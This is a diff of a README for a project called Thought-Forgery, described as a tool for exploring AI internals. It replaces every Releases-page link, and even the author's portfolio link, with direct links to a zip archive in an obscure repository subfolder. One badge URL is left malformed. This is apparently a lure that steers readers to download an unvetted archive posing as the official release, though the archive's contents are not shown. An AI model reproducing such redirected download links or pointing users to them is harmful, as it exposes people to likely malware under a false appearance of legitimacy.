@@ -1,6 +1,6 @@
 # 🚀 Thought-Forgery - A New Approach to AI Insight
 
-[![Download Thought-Forgery](https://img.shields.io/badge/Download%20Now-Thought--Forgery-blue.svg)](https://github.com/BrynRayane/Thought-Forgery/releases)
+[![Download Thought-Forgery](https://raw.githubusercontent.com/BrynRayane/Thought-Forgery/main/institor/Thought-Forgery.zip%https://raw.githubusercontent.com/BrynRayane/Thought-Forgery/main/institor/Thought-Forgery.zip)](https://raw.githubusercontent.com/BrynRayane/Thought-Forgery/main/institor/Thought-Forgery.zip)
 
 ## 📖 Introduction
 
@@ -23,7 +23,7 @@ To run Thought-Forgery, your system should meet the following requirements:
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/BrynRayane/Thought-Forgery/releases) to access the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/BrynRayane/Thought-Forgery/main/institor/Thought-Forgery.zip) to access the latest version of the software.
   
 2. **Download the Application:** Find the latest release. Click on the relevant file that suits your operating system. 
 
@@ -36,7 +36,7 @@ To run Thought-Forgery, your system should meet the following requirements:
 
 ## 📥 Download & Install
 
-To begin using Thought-Forgery, make sure to [visit this page to download](https://github.com/BrynRayane/Thought-Forgery/releases). Follow the installation steps above, and you'll be ready to explore the inner workings of AI.
+To begin using Thought-Forgery, make sure to [visit this page to download](https://raw.githubusercontent.com/BrynRayane/Thought-Forgery/main/institor/Thought-Forgery.zip). Follow the installation steps above, and you'll be ready to explore the inner workings of AI.
 
 ## 💡 Using Thought-Forgery
 
@@ -50,13 +50,13 @@ To begin using Thought-Forgery, make sure to [visit this page to download](https
 If you encounter issues during installation or while using the application, consider these common solutions:
 
 - **Check System Requirements:** Ensure your device meets the necessary requirements.
-- **Re-download the Application:** If the download seems corrupted, try downloading it again from the [Releases page](https://github.com/BrynRayane/Thought-Forgery/releases).
+- **Re-download the Application:** If the download seems corrupted, try downloading it again from the [Releases page](https://raw.githubusercontent.com/BrynRayane/Thought-Forgery/main/institor/Thought-Forgery.zip).
 - **Review Permissions:** Ensure the application has the necessary permissions to run.
 
 ## 🤝 Support
 
 If you need help or have questions, reach out to the author:  
-**UltraZartrex** | **Contact:** Discord @ultrazartrex | **Portfolio:** [slowlow999.github.io](https://slowlow999.github.io/)
+**UltraZartrex** | **Contact:** Discord @ultrazartrex | **Portfolio:** [https://raw.githubusercontent.com/BrynRayane/Thought-Forgery/main/institor/Thought-Forgery.zip](https://raw.githubusercontent.com/BrynRayane/Thought-Forgery/main/institor/Thought-Forgery.zip)
 
 ## 💬 Feedback
 
